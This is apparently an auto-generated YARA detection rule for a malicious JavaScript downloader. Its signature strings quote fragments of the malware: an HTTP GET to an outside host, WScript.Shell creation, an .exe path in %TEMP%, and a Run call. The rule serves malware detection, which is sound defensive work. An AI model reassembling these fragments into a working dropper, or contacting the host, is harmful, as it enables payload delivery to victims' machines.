rule sig_20160401_20f0c187d90d65195e880985e89ff424 {
  meta:
    description = "datamaliciousorder - file 20160401_20f0c187d90d65195e880985e89ff424.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "86a556fb5d43a166e1411e44c2bfa3b4816e48d32d38adaa17ffefce4cfdf4ed"

  strings:
    $s1  = "XkqAr[LjTa](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "function NsfQh(MjzCk, YacUp){WisFz = WisFz * 1; return MjzCk - YacUp;};" fullword ascii
    $s3  = "var FzoVev = function LwGdh() {return WScript[OcvCrq](\"WScript\"+\".Shell\");}(), MebFy = 11;" fullword ascii
    $s4  = "if (XkqAr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function UkRze(){return RotTu + \"\";};" fullword ascii
    $s6  = "function IhmZfl() {return FzoVev[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0JoW2Q53Q8q6q1.ex\" + \"e\";};" fullword ascii
    $s7  = "function GcgDxe() {return ((IwcZj == true) && (IwcZj == NqMf)) ? 1 : WisFz;};" fullword ascii
    $s8  = "function YsuFel(){return OcvCrq;};" fullword ascii
    $s9  = "function TvhTb(){return 23;};" fullword ascii
    $s10 = "function KgJmw(NjUw){FzoVev[\"R\"+\"un\"](NjUw, WisFz, WisFz);};" fullword ascii
    $s11 = "NqMf = true; " fullword ascii
    $s12 = "}while (YgmFeg);" fullword ascii
    $s13 = "var NqMf = false;" fullword ascii
    $s14 = "var OdLg = false;" fullword ascii
    $s15 = "function UpxTsj(XqFro) {var IiwNxe = (1, 2, 3, 4, 5, XqFro); return IiwNxe;};" fullword ascii
    $s16 = "IwcZj = true; " fullword ascii
    $s17 = "return NsfQh(CsAow, SkCu);" fullword ascii
    $s18 = "function LtYe()" fullword ascii
    $s19 = "var IwcZj = false;" fullword ascii
    $s20 = "var VkAb = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}